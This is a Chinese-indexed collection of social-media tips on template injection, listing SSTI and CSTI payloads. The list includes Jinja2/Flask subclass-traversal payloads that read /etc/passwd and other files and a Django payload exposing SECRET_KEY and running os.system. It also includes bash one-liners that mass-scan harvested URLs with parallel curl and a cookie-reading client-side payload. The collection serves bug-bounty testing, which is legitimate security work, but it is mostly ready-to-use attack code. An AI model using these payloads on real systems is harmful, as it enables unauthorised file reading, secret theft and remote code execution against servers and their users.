# X 语料 · SSTI 模板注入（1）

来源：X 公开贴子，经逐条人工阅读筛选后按技术主题归类。仅纯文本，图片与外部媒体已剥离。
作者自述内容，未经复现验证。

> 原贴时间跨度为 2019-2026，条目均为作者自述、未经复现验证；部分技巧可能已随产品版本失效。
> 判定协议：[SSTI](../by-type/ssti.md) · 索引与计数：[x-corpus.md](x-corpus.md) · 本文 91 行

- SSTI payload to read arbitrary files on a Flask server:
  {{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/tmp/flag").read() }}
- if [] is block in jinja2 ssti , you can use pop() function. try below payload to read internal files.
  {{[].__class__.__base__.__subclasses__().pop(40)('/etc/passwd').read()}}
- Python Flask SSTI Payloads and tricks
  * {{url_for.__globals__}}
  * {{request.environ}}
  * {{config}}
  *`{{url_for.__globals__.__builtins__.open('/etc/passwd').read()}}`
  * {{self}}
  * request|attr('__class__') == request.__class__ == request[\x5f\x5fclass\x5f\x5f]
- in reset password functionality if the host header bug work try to inject SSTI payload ${{7*7}} on X-Forwarded-Host for more impact .
- Bash oneliner get SSTI
  echo "domain" | subfinder -silent | waybackurls | gf ssti | qsreplace "{{''.class.mro[2].subclasses()[40]('/etc/passwd').read()}}" | parallel -j50 -q curl -g | grep "root:x"
- Automate Server-side Template Injection:
  cat sstipatterns.txt | xargs -P 50 -I host bash -c "curl -s -L 'host' | grep \"check-ssti49\" && echo -e \"[VULNERABLE] - host \n \" | grep "VULNERABLE"
- in an email field
  the payload {{7*7}} got converted to {7*7}, used a payload for Django template injection {% debug %}
  to leak Debug information
- Find Template Injection through curl
  Recon, Content Discovery process has megs of lines recon.txt
  cat recon.txt | grep "=" | qsreplace "ssti{{9*9}}" > sssti
  cat sssti | parallel -j50 -q curl -g | grep "ssti81" > ssti2_poc
- Client-Side Template Injection Tips
  {{3*3}} = 9
  {{5*3}} = 15
  Your alert cookie with
  {{constructor.constructor('alert(document.cookie)')()}}
- Payload: `{%for c in [1,2,3] %}{{c,c,c}}{% endfor %}`
- SSTI (Server Side Template Injection) Payload List
  {7*7}
  *{7*7}
  {{7*7}}
  [[7*7]]
  ${7*7}
  @(7*7)
  <?=7*7?>
  <%= 7*7 %>
  ${= 7*7}
  {{= 7*7}}
  ${{7*7}}
  #{7*7}
  [=7*7]
  If evaluated as 49 - the target is vulnerable
- Testing for SSTI, used {{7*7}} in username field.
  The main website was not vulnerable and the payload {{7*7}} didn't execute.
  Months later a promotional email from that target executed the payload. Check your mails.
- Top SSTI Payloads
  {{4*4}}[[5*5]]
  {{7*7}}
  {{7*'7'}}
  <%= 7 * 7 %>
  ${3*3}
  ${{7*7}}
  @(1+2)
  #{3*3}
  #{ 7 * 7 }
  {{dump(app)}}
- {{7*7}} returns 49
  {{7+7}} returns 14
  {{7-7}} returns 0
  Not in Response, it showed on the app after rendering! Client side!
  So, It's CSTI, not SSTI
  Tip: try the basic {{7*7}} in every inputs
- => Insert a payload in the email field: `test+${{7*7}}@example.com`
  => Check the response:
  If you receive an email with `test+49@example.com`,
  => it confirms the presence of SSTI.
- Quick SSTI Fuzzing Payload
  curl -X GET "https://target.com/page?name={{7*7}}" -H "User-Agent: Burp"
  If response contains 49, you likely have a Server-Side Template Injection!
- Note: Sometimes, the template engine may only evaluate math or echo variables, rather than execute full code. Always validate carefully
  Sample Payloads to Try:
  {{7*7}}
  ${7*7}
  <%= 7*7 %>
  ${{7*7}}
  #{7*7}
- SSTI (Server Side Template Injection)
  Python :
  {% debug %}
  {{settings.SECRET_KEY}}
  {% import foobar %} = Error
  {% import os %}{{os.system('whoami')}}
